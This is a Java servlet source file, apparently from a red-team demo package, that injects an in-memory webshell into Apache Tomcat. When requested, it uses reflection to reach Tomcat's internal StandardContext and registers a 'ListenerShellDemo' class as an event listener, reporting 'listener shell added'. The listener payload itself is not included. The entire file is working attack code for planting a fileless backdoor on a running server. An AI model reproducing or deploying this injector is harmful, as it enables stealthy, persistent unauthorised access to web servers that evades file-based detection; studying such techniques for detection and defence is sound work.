package cc.saferoad.servlet.listenermemshell;/*
@auther S0cke3t
@date 2021-12-29
*/

import org.apache.catalina.core.ApplicationContext;
import org.apache.catalina.core.StandardContext;

import javax.servlet.*;
import javax.servlet.http.*;
import javax.servlet.annotation.*;
import java.io.IOException;
import java.lang.reflect.Field;

@WebServlet(name = "ListenerShellIndex", value = "/ListenerShellIndex")
public class ListenerShellIndex extends HttpServlet {
    @Override
    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
        doPost(request,response);
    }

    @Override
    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
        ServletContext servletContext = request.getServletContext();
        StandardContext standardContext;
        try{
            Field applicationContextField = servletContext.getClass().getDeclaredField("context");
            applicationContextField.setAccessible(true);
            ApplicationContext applicationContext = (ApplicationContext)applicationContextField.get(servletContext);

            Field standContextField = applicationContext.getClass().getDeclaredField("context");
            standContextField.setAccessible(true);
            standardContext = (StandardContext)standContextField.get(applicationContext);
            Class<?> listenerShellClass = cc.saferoad.servlet.listenermemshell.ListenerShellDemo.class;
            standardContext.addApplicationEventListener(listenerShellClass.newInstance());
            response.getWriter().println("listener shell added");
        }
        catch(Exception e){
            e.printStackTrace();
        }
    }
}
